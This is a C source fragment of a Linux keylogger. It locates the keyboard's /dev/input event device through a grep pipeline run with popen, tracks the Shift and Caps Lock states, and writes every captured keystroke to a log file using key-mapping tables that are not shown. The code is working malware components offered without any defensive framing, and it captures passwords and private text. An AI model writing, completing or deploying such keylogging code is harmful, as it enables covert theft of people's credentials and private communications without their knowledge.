
#define FILE_PATH_LEN	20
#define EVENT_LEN	10

char *input_device()
{
	char event_file[EVENT_LEN];
	char	grep_command[] = "grep -E 'Handler|EV' /proc/bus/input/devices | "
				 "grep -B1 120013 | "
				 "grep -Eo event[0-9]+ | "
				 "tr '\\n' '\\0'",
		device_file_path[FILE_PATH_LEN] = "/dev/input/";
	FILE *output_command;

	if((output_command = popen(grep_command,"r")) == NULL)
	{
		perror("popen ");
		exit(1);
	}

	fgets(event_file,EVENT_LEN,output_command);
	strncat(device_file_path,event_file,EVENT_LEN);

	return strdup(device_file_path);
}

unsigned short int shift_pressed(struct input_event *kbd_event)
{
	if(kbd_event->code == KEY_LEFTSHIFT || kbd_event->code == KEY_RIGHTSHIFT)
		return 1;
	else
		return 0;
}

unsigned short int capslock_pressed(struct input_event *kbd_event)
{
	if(kbd_event->code == KEY_CAPSLOCK)
		return 1;
	else
		return 0;
}

void log_key(unsigned short int shift,unsigned short int capslock,unsigned short int code,FILE *log)
{
			if(code > 120)
				fprintf(log,"<Unknown>");

			else if(shift == 0 && capslock == 0)
				fprintf(log,"%s",keys[code]);

			else if(shift == 0 && capslock == 1)
				fprintf(log,"%s",caps_keys[code]);

			else if(shift == 1 && capslock == 0)
				fprintf(log,"%s",shift_keys[code]);

			else if(shift == 1 && capslock == 1)
				fprintf(log,"%s",caps_shift_keys[code]);

			fflush(log);
}
